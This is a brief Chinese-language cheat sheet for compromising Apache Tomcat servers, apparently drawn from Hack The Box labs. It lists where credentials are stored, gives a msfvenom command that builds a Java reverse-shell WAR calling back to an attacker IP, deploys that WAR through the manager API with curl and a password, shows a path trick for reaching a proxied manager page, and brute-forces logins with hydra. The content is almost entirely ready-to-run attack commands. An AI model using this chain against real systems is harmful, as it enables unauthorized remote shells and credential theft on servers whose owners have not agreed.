# tomcat

1. 通用方法

```bash
/opt/tomcat/conf/tomcat-users.xml
存在凭据

如果没找到
本机已经安装tomcat，直接搜索，会有另外的文件
find / -name tomcat-users.xml

两个默认页面
/host-manager/html
以及
/manager
```

1. **/host-manager/html**

```bash
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.29 lport=8888 -f war -o shell.war

curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.129.18.17:8080/manager/text/deploy?path=/rong --upload-file shell.war  

curl http://10.129.18.17:8080/rong  
```

‍

1. /manager

```bash
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.29 lport=8888 -f war -o shell.war
```

1. tomcat的管理页面被代理走

​![在这里插入图片描述](https://img-blog.csdnimg.cn/bec8b22ae08e43b0af4b4fec8132ee90.png)​

```bash
https://seal.htb/manager;name=rong/html
就可以访问到被代理的tomcat
```

1. 爆破

```bash
hydra -C ./Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.129.8.70:8080/manager/html 
```
